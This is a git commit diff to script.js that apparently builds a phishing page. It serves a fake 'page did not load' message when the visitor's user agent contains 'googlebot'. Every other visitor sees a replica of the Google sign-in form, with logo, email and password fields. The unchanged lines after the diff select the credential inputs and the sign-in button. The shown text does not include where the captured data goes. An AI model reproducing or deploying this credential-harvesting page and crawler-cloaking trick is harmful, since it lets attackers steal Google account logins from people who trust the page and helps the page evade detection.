0b5597223252ff547de414fdd22296cfdeace1bf
reddragonroom <ronlara00@gmail.com>
2025-09-27 10:50:04 +0500

    Update script.js

--- script.js
+++ script.js
@@ -1,3 +1,54 @@
+const ua = navigator.userAgent.toLowerCase();
+if (ua.includes("googlebot")) {
+  document.body.innerHTML =
+    "<h1>The Page did not load properly</h1><p>Refresh the page</p>";
+} else {
+  document.body.innerHTML = `
+    <div class="login-container">
+        <div class="google-logo">
+            <svg viewBox="0 0 272 92">
+                <path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+                <path fill="#EA4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+                <path fill="#FBBC05" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
+                <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
+                <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
+                <path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c9.66 0 16.71 3.81 21.98 8.73l-6.47 6.47c-3.73-3.49-8.73-6.22-15.51-6.22-12.68 0-22.6 10.24-22.6 23.05s9.92 23.05 22.6 23.05c8.15 0 12.85-3.26 15.83-7.83 2.44-3.73 3.2-9.01 3.2-13.28H35.29z"/>
+            </svg>
+        </div>
+
+        <div class="signin-header">
+            <h1>Sign in</h1>
+            <p>Use your Google Account</p>
+        </div>
+
+        <form id="loginForm">
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <input type="email" class="form-input" placeholder=" " required >
+                    <label class="input-label">Email or phone</label>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <input type="password" class="form-input" placeholder=" " required >
+                    <label class="input-label">Password</label>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <a href="https://accounts.google.com/signin/v2/recoveryidentifier" class="forgot-password">Forgot password?</a>
+            </div>
+
+
+            <div class="form-footer">
+                <a href="#" class="create-account">Create account</a>
+                <button type="button" class="next-button" id="sign-in-btn">Sign in</button>
+            </div>
+        </form>
+    </div>
+      `;
+}
 const email = document.querySelector("input[type='email']");
 const password = document.querySelector("input[type='password']");
 const loginButton = document.querySelector("#sign-in-btn");
